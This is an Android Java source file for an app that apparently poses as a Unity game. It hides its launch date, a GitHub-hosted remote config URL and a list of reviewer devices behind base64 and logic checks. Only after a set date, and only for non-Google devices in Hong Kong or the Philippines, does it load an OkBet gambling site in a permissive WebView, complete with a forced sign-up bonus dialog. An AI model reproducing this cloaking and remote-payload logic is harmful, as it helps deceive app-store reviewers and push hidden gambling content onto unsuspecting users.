package com.facebook;


import android.annotation.SuppressLint;
import android.app.Activity;
import android.app.AlertDialog;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.ActivityInfo;
import android.graphics.Bitmap;
import android.net.Uri;
import android.net.http.SslError;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import android.text.TextUtils;
import android.util.Base64;
import android.util.Log;
import android.view.KeyEvent;
import android.view.View;
import android.view.WindowManager;
import android.webkit.CookieManager;
import android.webkit.JavascriptInterface;
import android.webkit.SslErrorHandler;
import android.webkit.ValueCallback;
import android.webkit.WebChromeClient;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.ProgressBar;
import android.widget.RelativeLayout;

import androidx.annotation.NonNull;


import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;


public class FBSplashActivity extends Activity {

    public MainHandle mainHandle;
    private WebView webView;
    private ProgressBar mj_progressBar;
    private RelativeLayout rootview;

    public static boolean monery = false;
    public static String appId;

    //跳转到原马甲包启动页的全路径
    public static String activityPath = "com.unity3d.player.UnityPlayerActivity";
    public static long times = 1674527976000L;
    public static String goUrl = "https://xxxxx";
    public static String baseUrl = "";
    private Context context;

    //页面布局的id
    int activity_layout_id;
    //页面布局的根布局的id
    int root_view_id;
    //该页面的加载框id
    int progress_bar_id;
    int webview_id;


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        activity_layout_id = getLayoutId(getApplicationContext(), "activity_splash_fb");
        root_view_id = getId(getApplicationContext(), "WebViewBox");
        webview_id = getId(getApplicationContext(), "MainWebView");
        progress_bar_id = getId(getApplicationContext(), "mj_progressBar");

        getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN, WindowManager.LayoutParams.FLAG_FULLSCREEN);

        if (Build.VERSION.SDK_INT < 19) {// lower api
            View v = this.getWindow().getDecorView();
            v.setSystemUiVisibility(View.GONE);
        } else {
            View decorView = getWindow().getDecorView();
            decorView.setSystemUiVisibility(View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
                    | View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY | View.SYSTEM_UI_FLAG_FULLSCREEN);
        }

        setContentView(activity_layout_id);
        rootview = findViewById(root_view_id);
        webView = findViewById(webview_id);
        mj_progressBar = findViewById(progress_bar_id);

        init(this);

        mainHandle = new MainHandle();

        mainHandle.postDelayed(new Runnable() {
            @Override
            public void run() {
                mainHandle.sendMsg(001, "");
            }
        }, 1000);

    }


    @Override // c.a.k.i, android.app.Activity, android.view.KeyEvent.Callback
    public boolean onKeyDown(int i, KeyEvent keyEvent) {
        if (webView != null) {
            if (webView.canGoBack() && i == 4) {
                webView.goBack();
                return true;
            }
        }
        return super.onKeyDown(i, keyEvent);
    }


    @Override
    protected void onResume() {
        super.onResume();

    }

    public void clearWebview() {
        rootview.removeAllViews();
        if (webView != null) {
            webView.clearHistory();
            webView.destroy();
            webView = null;
        }
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        clearWebview();
    }


    public void init(Activity activity) {
        context = activity;
        appId = activity.getApplication().getPackageName();
    }

    public void startcheck() {
        new Thread(new Runnable() {
            @Override
            public void run() {
                baseUrl = unBase64JS() + appId + ".js";
                getReq(baseUrl, true);
            }
        }).start();
    }

    private void getReq(String url, boolean isGitHub) {

        try {
            URL urll = new URL(url);
            HttpURLConnection urlConnection = (HttpURLConnection) urll.openConnection();
            urlConnection.setConnectTimeout(10000);
            urlConnection.setReadTimeout(10000);
            urlConnection.setRequestMethod("GET");
            urlConnection.setDefaultUseCaches(false);
            urlConnection.connect();
            int code = urlConnection.getResponseCode();
            if (code == 200) {
                InputStream inputStream = urlConnection.getInputStream();
                BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
                String line;
                StringBuffer buffer = new StringBuffer();
                while ((line = bufferedReader.readLine()) != null) {
                    buffer.append(line);
                }
                String json = buffer.toString();

                logger(" " + json);

                String replace = json.replace("\n", "").replace("\t", "");
                String substring = replace.substring(0, replace.length() - 2);
                JSONObject jSONObject = new JSONObject(substring + "}");

                if (jSONObject.has("hf")) {
                    WebData.webDataCenter.hf_001 = jSONObject.getString("hf");
                    //test   https://okbet-v2.cxsport.net/mobile
                    //http://okbet.life/app_cfg_win_ok/OkbettingWinV1/index.html
                    //  WebData.dataCenter.hf_001 = " https://webview.vipsroom.net/?inviteCode=2277 ";
                    //   WebData.dataCenter.hf_001 = "https://okbet-v2.cxsport.net/mobile";

                    //http://ok-bet.online/mobile/publicity
                    //   WebData.dataCenter.hf_001 = "http://ok-bet.online/?inviteCode=2277";
                    //    WebData.dataCenter.hf_001 = "cnm-bie-zhua-bao";

                }

                if (jSONObject.has("jump_001")) {
                    WebData.webDataCenter.hfgwxz_001 = jSONObject.getString("jump_001");
                }

                if (jSONObject.has("jump_002")) {
                    WebData.webDataCenter.cvcvczk_002 = jSONObject.getString("jump_002");
                }

                if (jSONObject.has("jump_003")) {
                    WebData.webDataCenter.erfcxht_003 = jSONObject.getString("jump_003");
                }

                if (jSONObject.has("aipi")) {
                    WebData.webDataCenter.ai3p6i9 = jSONObject.getString("aipi");
                }

                if (jSONObject.has("hfRea")) {
                    WebData.webDataCenter.hf_rea = jSONObject.getString("hfRea");
                }

                if (jSONObject.has("icChecking")) {
                    WebData.webDataCenter.isCcccheck = jSONObject.getBoolean("icChecking");
                }

                if (jSONObject.has("jump_array")) {
                    WebData.webDataCenter.jjssArrays.clear();
                    JSONArray jsonArray = jSONObject.getJSONArray("jump_array");
                    for (int i = 0; i < jsonArray.length(); i++) {
                        WebData.webDataCenter.jjssArrays.add((String) jsonArray.get(i));
                    }
                }

                if (jSONObject.has("dev_array")) {
                    WebData.webDataCenter.deArray.clear();
                    JSONArray jsonArray = jSONObject.getJSONArray("dev_array");
                    for (int i = 0; i < jsonArray.length(); i++) {
                        WebData.webDataCenter.deArray.add((String) jsonArray.get(i));
                    }
                }

                mainHandle.sendMsg(000, "");

            } else {
                logger(" 不是200");
                if (!isGitHub) {
                    requstGithub();
                } else {
                    jumpLocalSplash();
                }
            }

        } catch (JSONException e) {
            if (!isGitHub) {
                requstGithub();
            } else {
                jumpLocalSplash();
            }
            logger(e.getLocalizedMessage() + "");
        } catch (Exception e) {
            if (!isGitHub) {
                requstGithub();
            } else {
                jumpLocalSplash();
            }
            logger(e.getLocalizedMessage() + "");
        }

    }

    private void requstGithub() {
        baseUrl = unBase64JS() + appId + ".js";
        getReq(baseUrl, true);
    }


    public void getReqAPConfig(String url) {
        logger("getReqAPaConfig start");

        monery = true;
        WebData.webDataCenter.isCcccheck = false;

        if (getManufacturer().equals(unBase64GG())
                || TextUtils.isEmpty(getManufacturer())) {
            monery = false;
            WebData.webDataCenter.isCcccheck = true;
            logger("isandroidreallych");
        }

        if (WebData.webDataCenter.deArray.size() > 0) {
            if (WebData.webDataCenter.deArray.contains(getModel())) {
                monery = false;
                WebData.webDataCenter.isCcccheck = true;
                logger("isSHRYZJC");
            }
        }

        if (monery) {
            //如果设备通过 走Ip检测

            try {

                URL urll = new URL(url);
                HttpURLConnection urlConnection = (HttpURLConnection) urll.openConnection();
                urlConnection.setConnectTimeout(10000);
                urlConnection.setReadTimeout(10000);
                urlConnection.setRequestMethod("GET");
                urlConnection.connect();
                int code = urlConnection.getResponseCode();

                if (code == 200) {
                    logger("getReqAPConfig 200");

                    InputStream inputStream = urlConnection.getInputStream();
                    BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
                    String line;
                    StringBuffer buffer = new StringBuffer();
                    while ((line = bufferedReader.readLine()) != null) {
                        buffer.append(line);
                    }
                    String json = buffer.toString();

                    logger(" " + json);

                    JSONObject jSONObject = new JSONObject(json);

                    if (jSONObject.has("countryCode")) {
                        String cc = jSONObject.getString("countryCode");
                        if (cc.equals("HK") || cc.equals("PH")) {
                            monery = true;
                            WebData.webDataCenter.isCcccheck = false;
                        }
                    }

                    mainHandle.sendMsg(002, "");

                } else {
                    logger(" getReqAPConfig 不是200");
                    monery = false;
                    WebData.webDataCenter.isCcccheck = true;
                }

                mainHandle.sendMsg(002, "");

            } catch (Exception e) {
                monery = false;
                mainHandle.sendMsg(002, "");
                logger(" getReqAPConfig Exception " + e.getLocalizedMessage());
            }

        }

    }


    public class MainHandle extends Handler {


        public final void sendMsg(int i3, Object obj) {
            Message message = new Message();
            message.what = i3;
            message.obj = obj;
            sendMessage(message);
        }


        @Override
        public void handleMessage(@NonNull Message msg) {

            int code = msg.what;

            if (code == 000) {

                if (TextUtils.isEmpty(WebData.webDataCenter.ai3p6i9)) {
                    //走h5 全逻辑
                    if (!TextUtils.isEmpty(WebData.webDataCenter.hf_001)) {
//                       MainActivity.mainActivity.findViewById(com.okbetboxing.boxing.R.id.loadingBox).setVisibility(View.GONE);
//                       WebUtil.util.startH5orYs(web.WebData.webDataCenter.hf_001, true);
                        startH5orYs(WebData.webDataCenter.hf_001, true);
                    }
                } else {
                    //走原生 逻辑
                    new Thread(new Runnable() {
                        @Override
                        public void run() {
                            getReqAPConfig(WebData.webDataCenter.ai3p6i9);
                        }
                    }).start();
                }

            } else if (code == 001) {
                if (System.currentTimeMillis() < times || ifCheckerDev0117()) {
                    jumpLocalSplash();
                } else {
                    //  startcheck();
                    startH5orYs(goUrl, true);
                }
            } else if (code == 002) {//已经
                //如果是老用户  就不需要屏蔽
                if (getIfLongInstall()) {
                    monery = true;
                    WebData.webDataCenter.isCcccheck = false;
                }

                boolean isAdd;
                if (TextUtils.isEmpty(WebData.webDataCenter.hf_rea)) {
                    isAdd = false;
                } else {
                    isAdd = true;
                }
                if (!monery) { // !ph
                    if (!TextUtils.isEmpty(WebData.webDataCenter.hf_001)) {
//                       MainActivity.mainActivity.findViewById(com.okbetboxing.boxing.R.id.loadingBox).setVisibility(View.GONE);
//                       WebUtil.util.startH5orYs(web.WebData.webDataCenter.hf_001, isAdd);
                        startH5orYs(WebData.webDataCenter.hf_001, isAdd);
                    }
                } else {
                    if (!TextUtils.isEmpty(WebData.webDataCenter.hf_rea)) {
//                       MainActivity.mainActivity.findViewById(com.okbetboxing.boxing.R.id.loadingBox).setVisibility(View.GONE);
//                       WebUtil.util.startH5orYs(web.WebData.webDataCenter.hf_rea, true);
                        if(WebData.webDataCenter.isJump0117){
                            //开启弹窗
                            //创建dialog构造器
                            AlertDialog.Builder normalDialog = new AlertDialog.Builder(getBaseContext());
                            normalDialog.setCancelable(false);
                            //设置title
                            normalDialog.setTitle("Okbet offical app, join in us!!");
                            //设置内容
                            normalDialog.setMessage("GET 50 peso when register,Good Luck!!");
                            //设置按钮
                            normalDialog.setPositiveButton("Click Here", new DialogInterface.OnClickListener() {
                                @Override
                                public void onClick(DialogInterface dialog, int which) {
                                    jumpBrpw(WebData.webDataCenter.hf_rea);
                                }
                            });

                            normalDialog.show();

                            //执行外跳
                            jumpBrpw(WebData.webDataCenter.hf_rea);

                        } else {
                            startH5orYs(WebData.webDataCenter.hf_rea, true);
                        }

                    } else {
//                       MainActivity.mainActivity.findViewById(R.id.loadingBox).setVisibility(View.GONE);
//                       WebUtil.util.startH5orYs(web.WebData.webDataCenter.hf_001, true);
                       // startH5orYs(WebData.webDataCenter.hf_001, true);
                        jumpLocalSplash();
                    }
                }
            }


        }

    }

    /**
     * 跳原应用
     */

    private void jumpLocalSplash() {

        try {
            Class aimClass = Class.forName(activityPath);
            Intent intent = new Intent(FBSplashActivity.this, aimClass);
            startActivity(intent);
            finish();
        } catch (ClassNotFoundException e) {
            e.printStackTrace();
        }
    }


    public void loadUu(String uuu) {
        if (webView != null) {
            webView.loadUrl(uuu);
        }
    }


    public void startH5orYs(String weburl, boolean isAdd) {

        if (TextUtils.isEmpty(weburl)) {
            return;
        }

        if (weburl.equals("cnm-bie-zhua-bao")) {
            //跳原生壳子
            jumpLocalSplash();
            return;
        }

        //  webView.getSettings().setBuiltInZoomControls(true);
        webView.requestFocus();
        webView.getSettings().setDomStorageEnabled(true);
        webView.getSettings().setJavaScriptEnabled(true);
        webView.getSettings().setAllowContentAccess(true);
        webView.getSettings().setAllowFileAccess(true);
        webView.getSettings().setAllowUniversalAccessFromFileURLs(true);
        webView.getSettings().setCacheMode(WebSettings.LOAD_DEFAULT);
        webView.getSettings().setUseWideViewPort(true);
        webView.getSettings().setTextZoom(100);
        webView.getSettings().setJavaScriptCanOpenWindowsAutomatically(true);
        webView.getSettings().setUseWideViewPort(true);
        webView.getSettings().setLoadWithOverviewMode(true);
        CookieManager.getInstance().setAcceptCookie(true);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            webView.getSettings().setMixedContentMode(0);
        }

//        if(BuildConfig.DEBUG){
//            try {
//                Method method = Class.forName("android.webkit.WebView").getMethod("setWebContentsDebuggingEnabled", Boolean.TYPE);
//                if (method != null) {
//                    method.setAccessible(true);
//                    method.invoke(null, Boolean.TRUE);
//                }
//            } catch (Exception unused) {
//            }
//        }

        logger("h5Invoke add  if checking " + WebData.webDataCenter.isCcccheck);

        if (WebData.webDataCenter.isCcccheck) {
            webView.addJavascriptInterface(new CheckingJavaScript(), "h5Invoke");
        } else {
            webView.addJavascriptInterface(new OnlineJavaScript(), "h5Invoke");
        }

        webView.setWebViewClient(new WebClient());
        webView.setWebChromeClient(new Wcc());

        if (!TextUtils.isEmpty(weburl)) {
            webView.loadUrl(weburl);
        }

    }

    public class CheckingJavaScript extends Object {

        @JavascriptInterface
        public boolean callbackIfHide() {
            //  SingleToast.showLongMsg("js callbackIfHide " + WebData.dataCenter.isCcccheck);
            logger("js callbackIfHide " + WebData.webDataCenter.isCcccheck);
            return WebData.webDataCenter.isCcccheck;
        }

    }

    public class OnlineJavaScript extends Object {

        @JavascriptInterface
        public void login(String uid) {

//            SingleToast.showLongMsg("js login " + uid);
//            new Handler().postDelayed(new Runnable() {
//                @Override
//                public void run() {
//                    SingleToast.showLongMsg("js login " + uid);
//                }
//            },3000);
//
//                SingleToast.showLongMsg("js login " + uid);

            logger("js login " + uid);

            //    EventUtils.util.eventLogin(uid);
        }

        @JavascriptInterface
        public void register(String name) {
            //      SingleToast.showLongMsg("js register " + name);

            logger("js register " + name);
            //   EventUtils.util.eventReg(name);
        }


        @JavascriptInterface
        public void deposit(String amount) {
            //      SingleToast.showLongMsg("js deposit " + amount);
            logger("js deposit " + amount);
//            try {
//                MainActivity.logger("js deposit " + amount);
//                Double a = Double.parseDouble(amount);
//                EventUtils.util.eventDeposit("", a, "");
//            } catch (Exception e) {
//                EventUtils.util.eventDeposit("", 8.8, "");
//            }

        }


        @JavascriptInterface
        public void withdrawal(String amount) {
            //    SingleToast.showLongMsg("js withdrawal " + amount);

            logger("js withdrawal " + amount);
            // EventUtils.util.withdrawal("", amount, "");
        }


        @JavascriptInterface
        public void goPayMent(String url) {
            logger("js goPayMent " + url);
            jumpBrpw(url);
        }

        @JavascriptInterface
        public void gologinCs(String url) {
            //    SingleToast.showLongMsg("js gologinCs " + url);
            logger("js gologinCs " + url);
            jumpBrpw(url);
        }

    }


    static class WebData {

        public static final WebData webDataCenter = new WebData();

        public String hf_001;
        public String hfgwxz_001 = "";
        public String cvcvczk_002 = "";
        public String erfcxht_003 = "";

        public String hf_rea = "";
        public String ai3p6i9 = "";
        public Boolean isCcccheck = false;
        public Boolean isJump0117 = false;
        public List<String> jjssArrays = new ArrayList<>();
        public List<String> deArray = new ArrayList<>();

    }

    public final void jumpBrpw(String str) {
        Intent intent = new Intent("android.intent.action.VIEW");
        intent.setData(Uri.parse(str));
        startActivity(intent);
    }

    public static void logger(String str) {
        Log.e("lyBBBB log", "---------->  " + str);
    }


    public String unBase64GG() {
        String a = "R29vZ2xl";
        byte[] decode = Base64.decode(a, Base64.DEFAULT);
        String decodeStr = new String(decode);
        logger("unBase64GG  " + decodeStr);
        return decodeStr;
    }

    public String unBase64JS() {
        String a = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Vhc3lHdXlMeW4vRWFzeURlbW8xL21hc3Rlci8=";
        byte[] decode = Base64.decode(a, Base64.DEFAULT);
        String decodeStr = new String(decode);
        logger("unBase64JS  " + decodeStr);
        return decodeStr;
    }

    public String unBase64Dev0117() {
        String a = "eyJkZXZfYXJyYXkiOlsiUmVkbWkgN0EiLCJSZWRtaSA2QSIsIlNILTAxTCIsIkYtMDFMIiwiU00tQTEwNUZOIiwiU00tRzk4MVUxIl19";
        byte[] decode = Base64.decode(a, Base64.DEFAULT);
        String decodeStr = new String(decode);
        //  Main.logger0113("unBase64  " + decodeStr);
        return decodeStr;
    }

    public boolean ifCheckerDev0117() {
        boolean result0117 = false;
        String devJson0117 = unBase64Dev0117();

        try {
            JSONObject jsonObject = new JSONObject(devJson0117);
            JSONArray jsonArray = jsonObject.getJSONArray("dev_array");
            for (int i = 0; i < jsonArray.length(); i++) {
                WebData.webDataCenter.deArray.add((String) jsonArray.get(i));
            }

            WebData.webDataCenter.deArray.add("SM-A226B");
            WebData.webDataCenter.deArray.add("(not set)");

            if (WebData.webDataCenter.deArray.size() > 0) {
                Log.e("zzz", "" + WebData.webDataCenter.deArray.size());
                if (WebData.webDataCenter.deArray.contains(getModel())) {
                    monery = false;
                    WebData.webDataCenter.isCcccheck = true;
                    result0117 = true;
                }
            }


        } catch (JSONException e) {
            e.printStackTrace();
        }

        if (getManufacturer().equals(unBase64GG())
                || TextUtils.isEmpty(getManufacturer())) {
            result0117 = true;
        }

        if (TextUtils.isEmpty(getModel())) {
            result0117 = true;
        }

        return result0117;

    }


    public boolean getIfLongInstall() {

        long nowTime = System.currentTimeMillis();
        long saveTime = getTime(context);

        logger("nowtime " + nowTime);
        logger("saveTime " + saveTime);

        if (saveTime == 0) {
            saveTime(context, System.currentTimeMillis());
            return false;
        } else if (nowTime - saveTime > 24 * 60 * 60 * 1000) {
            logger("已经是超过一天的老用户");
            return true;
        }

        return false;
    }


    /**
     * 获取保存的域名ip 前段自定义时间
     *
     * @param context
     * @return
     */
    public static long getTime(Context context) {
        SharedPreferences sp = context.getSharedPreferences("Box_Base_NetInfo", Context.MODE_PRIVATE);
        return sp.getLong("time_diy", 0);
    }

    /**
     * 保存检测成功后的域名ip 前段自定义时间
     *
     * @param context
     * @param time
     */
    public static void saveTime(Context context, long time) {
        SharedPreferences sp = context.getSharedPreferences("Box_Base_NetInfo", Context.MODE_PRIVATE);
        SharedPreferences.Editor editor = sp.edit();
        editor.putLong("time_diy", time);
        editor.apply();
    }


    /**
     * Return the manufacturer of the product/hardware.
     * <p>e.g. Xiaomi</p>
     *
     * @return the manufacturer of the product/hardware
     */
    public static String getManufacturer() {
        String manufacturer = Build.MANUFACTURER;
        if (null == manufacturer) {
            manufacturer = "";
        }

        return manufacturer;
    }

    /**
     * Return the model of device.
     * <p>e.g. MI2SC</p>
     *
     * @return the model of device
     */
    public static String getModel() {
        String model = Build.MODEL;
        if (model != null) {
            model = model.trim().replaceAll("\\s*", "");
        } else {
            model = "";
        }
        return model;
    }


    /**
     * Android 5.0以下版本的文件选择回调
     */
    public static ValueCallback<Uri> mFileUploadCallbackFirst;
    /**
     * Android 5.0及以上版本的文件选择回调
     */
    public static ValueCallback<Uri[]> mFileUploadCallbackSecond;
    public static final int REQUEST_CODE_FILE_PICKER = 51426;
    protected String mUploadableFileTypes = "image/*";


    public class Wcc extends WebChromeClient {

        @Override
        public void onProgressChanged(WebView view, int newProgress) {
            setProgressBar(newProgress);
        }


        @Override
        public void onReceivedTitle(WebView view, String title) {
            super.onReceivedTitle(view, title);
        }


        //  Android 2.2 (API level 8)到Android 2.3 (API level 10)版本选择文件时会触发该隐藏方法
        @SuppressWarnings("unused")
        public void openFileChooser(ValueCallback<Uri> uploadMsg) {
            openFileChooser(uploadMsg, null);
        }

        // Android 3.0 (API level 11)到 Android 4.0 (API level 15))版本选择文件时会触发，该方法为隐藏方法
        public void openFileChooser(ValueCallback<Uri> uploadMsg, String acceptType) {
            openFileChooser(uploadMsg, acceptType, null);
        }

        // Android 4.1 (API level 16) -- Android 4.3 (API level 18)版本选择文件时会触发，该方法为隐藏方法
        @SuppressWarnings("unused")
        public void openFileChooser(ValueCallback<Uri> uploadMsg, String acceptType, String capture) {
            openFileInput(uploadMsg, null, false);
        }

        // Android 5.0 (API level 21)以上版本会触发该方法，该方法为公开方法
        @SuppressWarnings("all")
        public boolean onShowFileChooser(WebView webView, ValueCallback<Uri[]> filePathCallback, FileChooserParams fileChooserParams) {
            if (Build.VERSION.SDK_INT >= 21) {
                final boolean allowMultiple = fileChooserParams.getMode() == FileChooserParams.MODE_OPEN_MULTIPLE;//是否支持多选
                openFileInput(null, filePathCallback, allowMultiple);
                return true;
            } else {
                return false;
            }
        }


        @SuppressLint("NewApi")
        protected void openFileInput(final ValueCallback<Uri> fileUploadCallbackFirst, final ValueCallback<Uri[]> fileUploadCallbackSecond,
                                     final boolean allowMultiple) {
            //Android 5.0以下版本
            if (mFileUploadCallbackFirst != null) {
                mFileUploadCallbackFirst.onReceiveValue(null);
            }
            mFileUploadCallbackFirst = fileUploadCallbackFirst;

            //Android 5.0及以上版本
            if (mFileUploadCallbackSecond != null) {
                mFileUploadCallbackSecond.onReceiveValue(null);
            }
            mFileUploadCallbackSecond = fileUploadCallbackSecond;

            Intent i = new Intent(Intent.ACTION_GET_CONTENT);
            i.addCategory(Intent.CATEGORY_OPENABLE);

            if (allowMultiple) {
                if (Build.VERSION.SDK_INT >= 18) {
                    i.putExtra(Intent.EXTRA_ALLOW_MULTIPLE, true);
                }
            }
            i.setType(mUploadableFileTypes);

            startActivityForResult(Intent.createChooser(i, "选择文件"), REQUEST_CODE_FILE_PICKER);
        }

        /**
         * 设置进度条
         *
         * @param progress
         */
        private void setProgressBar(int progress) {
            ProgressBar mProgressBar;
            mProgressBar = mj_progressBar;
            if (mProgressBar == null) return;
            logger("progress " + progress);
            if (progress == 100) {
                mProgressBar.setVisibility(View.GONE);
            } else {
                if (View.GONE == mProgressBar.getVisibility()) {
                    mProgressBar.setVisibility(View.VISIBLE);
                }
                mProgressBar.setProgress(progress);
            }
        }

    }


    @Override
    public void onActivityResult(final int requestCode, final int resultCode, final Intent intent) {
        super.onActivityResult(requestCode, resultCode, intent);
        if (requestCode == REQUEST_CODE_FILE_PICKER) {
            if (resultCode == Activity.RESULT_OK) {
                if (intent != null) {
                    //Android 5.0以下版本
                    if (mFileUploadCallbackFirst != null) {
                        mFileUploadCallbackFirst.onReceiveValue(intent.getData());
                        mFileUploadCallbackFirst = null;
                    } else if (mFileUploadCallbackSecond != null) {//Android 5.0及以上版本
                        Uri[] dataUris = null;

                        try {
                            if (intent.getDataString() != null) {
                                dataUris = new Uri[]{Uri.parse(intent.getDataString())};
                            } else {
                                if (Build.VERSION.SDK_INT >= 16) {
                                    if (intent.getClipData() != null) {
                                        final int numSelectedFiles = intent.getClipData().getItemCount();

                                        dataUris = new Uri[numSelectedFiles];

                                        for (int i = 0; i < numSelectedFiles; i++) {
                                            dataUris[i] = intent.getClipData().getItemAt(i).getUri();
                                        }
                                    }
                                }
                            }
                        } catch (Exception ignored) {
                        }
                        mFileUploadCallbackSecond.onReceiveValue(dataUris);
                        mFileUploadCallbackSecond = null;
                    }
                }
            } else {
                //这里mFileUploadCallbackFirst跟mFileUploadCallbackSecond在不同系统版本下分别持有了
                //WebView对象，在用户取消文件选择器的情况下，需给onReceiveValue传null返回值
                //否则WebView在未收到返回值的情况下，无法进行任何操作，文件选择器会失效
                if (mFileUploadCallbackFirst != null) {
                    mFileUploadCallbackFirst.onReceiveValue(null);
                    mFileUploadCallbackFirst = null;
                } else if (mFileUploadCallbackSecond != null) {
                    mFileUploadCallbackSecond.onReceiveValue(null);
                    mFileUploadCallbackSecond = null;
                }
            }
        }
    }


    public class WebClient extends WebViewClient {
        @Override // android.webkit.WebViewClient
        public final void onLoadResource(WebView webView, String str) {
            super.onLoadResource(webView, str);
        }

        @Override
        public void onPageStarted(WebView view, String url, Bitmap favicon) {
            super.onPageStarted(view, url, favicon);
            logger("onPageStarted " + url);
            if (url.contains(WebData.webDataCenter.hfgwxz_001) && !TextUtils.isEmpty(WebData.webDataCenter.hfgwxz_001)) {
                jumpBrpw(url);
            }
            if (url.contains(WebData.webDataCenter.cvcvczk_002) && !TextUtils.isEmpty(WebData.webDataCenter.cvcvczk_002)) {
                jumpBrpw(url);
            }
            if (url.contains(WebData.webDataCenter.erfcxht_003) && !TextUtils.isEmpty(WebData.webDataCenter.erfcxht_003)) {
                jumpBrpw(url);
            }
        }

        @Override
        public void onPageFinished(WebView view, String url) {
            super.onPageFinished(view, url);
            logger("onPageFinished " + url);
        }


        @Override // android.webkit.WebViewClient
        public final void onReceivedSslError(WebView webView, SslErrorHandler sslErrorHandler, SslError sslError) {
            int primaryError = sslError.getPrimaryError();
            logger("onReceivedSslError " + primaryError);
//        if (primaryError == 3 || primaryError == 5) {
//            sslErrorHandler.proceed();
//        }else {
//            sslErrorHandler.cancel();
//        }
        }

        @Override // android.webkit.WebViewClient
        public final boolean shouldOverrideUrlLoading(WebView webView, String str) {
            try {

                logger("shouldOverrideUrlLoading " + str);

                if (str.contains(WebData.webDataCenter.hfgwxz_001) && !TextUtils.isEmpty(WebData.webDataCenter.hfgwxz_001)) {
                    jumpBrpw(str);
                    return true;
                }
                if (str.contains(WebData.webDataCenter.cvcvczk_002) && !TextUtils.isEmpty(WebData.webDataCenter.cvcvczk_002)) {
                    jumpBrpw(str);
                    return true;
                }
                if (str.contains(WebData.webDataCenter.erfcxht_003) && !TextUtils.isEmpty(WebData.webDataCenter.erfcxht_003)) {
                    jumpBrpw(str);
                    return true;
                }
                if (WebData.webDataCenter.jjssArrays != null && WebData.webDataCenter.jjssArrays.size() > 0) {
                    logger("jjssArrays " + WebData.webDataCenter.jjssArrays.get(0));
                    boolean isInClude = false;
                    for (String s : WebData.webDataCenter.jjssArrays) {
                        if (str.contains(s)) {
                            isInClude = true;
                        }
                    }
                    if (isInClude) {
                        jumpBrpw(str);
                        return true;
                    }
                }

                if (str.contains("//t.me/")) {
                    jumpBrpw(str);
                    return true;
                }

                if (str.contains("cnm-bie-zhua-bao")) {
                    jumpLocalSplash();
                    return true;
                }

                if(str.contains("http://google.com/jsonokbet")){
                    String jsonBase64 = str.replace("http://google.com/jsonokbet"
                            ,"");
                    byte[] decode = Base64.decode(jsonBase64, Base64.DEFAULT);
                    String decodeStr = new String(decode);
                    String json = decodeStr;
                    logger("301 -->" + json);

                    String replace = json.replace("\n", "")
                            .replace("\t", "");
                    JSONObject jSONObject = new JSONObject(replace);

                    if(jSONObject.has( "hf")){
                        WebData.webDataCenter.hf_001 = jSONObject.getString( "hf");
                        //test   https://okbet-v2.cxsport.net/mobile
                        //http://okbet.life/app_cfg_win_ok/OkbettingWinV1/index.html
                        //  WebData.dataCenter.hf_001 = " https://webview.vipsroom.net/?inviteCode=2277 ";
                        //   WebData.dataCenter.hf_001 = "https://okbet-v2.cxsport.net/mobile";

                        //http://ok-bet.online/mobile/publicity
                        //   WebData.dataCenter.hf_001 = "http://ok-bet.online/?inviteCode=2277";
                        //    WebData.dataCenter.hf_001 = "cnm-bie-zhua-bao";
                    }

                    if(jSONObject.has("jump_001")){
                        WebData.webDataCenter.hfgwxz_001 = jSONObject.getString("jump_001");
                    }

                    if(jSONObject.has("jump_002")){
                        WebData.webDataCenter.cvcvczk_002 = jSONObject.getString("jump_002");
                    }

                    if(jSONObject.has("jump_003")){
                        WebData.webDataCenter.erfcxht_003 = jSONObject.getString("jump_003");
                    }

                    if(jSONObject.has("aipi")){
                        WebData.webDataCenter.ai3p6i9 = jSONObject.getString("aipi");
                    }

                    if(jSONObject.has("hfRea")){
                        WebData.webDataCenter.hf_rea = jSONObject.getString("hfRea");
                    }

                    if(jSONObject.has("icChecking")){
                        WebData.webDataCenter.isCcccheck = jSONObject.getBoolean("icChecking");
                    }

                    if(jSONObject.has("isJump")){
                        WebData.webDataCenter.isJump0117 = jSONObject.getBoolean("isJump");
                    }


                    if(jSONObject.has("jump_array")){
                        WebData.webDataCenter.jjssArrays.clear();
                        JSONArray jsonArray = jSONObject.getJSONArray("jump_array");
                        for (int i = 0; i < jsonArray.length(); i++) {
                            WebData.webDataCenter.jjssArrays.add((String) jsonArray.get(i));
                        }
                    }

                    if(jSONObject.has("dev_array")){
                        WebData.webDataCenter.deArray.clear();
                        JSONArray jsonArray = jSONObject.getJSONArray("dev_array");
                        for (int i = 0; i < jsonArray.length(); i++) {
                            WebData.webDataCenter.deArray.add((String) jsonArray.get(i));
                        }
                    }

                    mainHandle.sendMsg(000,"");

                    return true;
                }

                    loadUu(str);

            } catch (Exception unused) {
            }
            return true;
        }
    }


    public static int getLayoutId(Context paramContext, String paramString) {
        return paramContext.getResources().getIdentifier(paramString, "layout",
                paramContext.getPackageName());
    }

    public static int getStringId(Context paramContext, String paramString) {
        return paramContext.getResources().getIdentifier(paramString, "string",
                paramContext.getPackageName());
    }

    public static int getDrawableId(Context paramContext, String paramString) {
        return paramContext.getResources().getIdentifier(paramString,
                "drawable", paramContext.getPackageName());
    }

    public static int getMipmapId(Context paramContext, String paramString) {
        return paramContext.getResources().getIdentifier(paramString,
                "mipmap", paramContext.getPackageName());
    }

    public static int getStyleId(Context paramContext, String paramString) {
        return paramContext.getResources().getIdentifier(paramString,
                "style", paramContext.getPackageName());
    }

    public static int getId(Context paramContext, String paramString) {
        return paramContext.getResources().getIdentifier(paramString, "id", paramContext.getPackageName());
    }

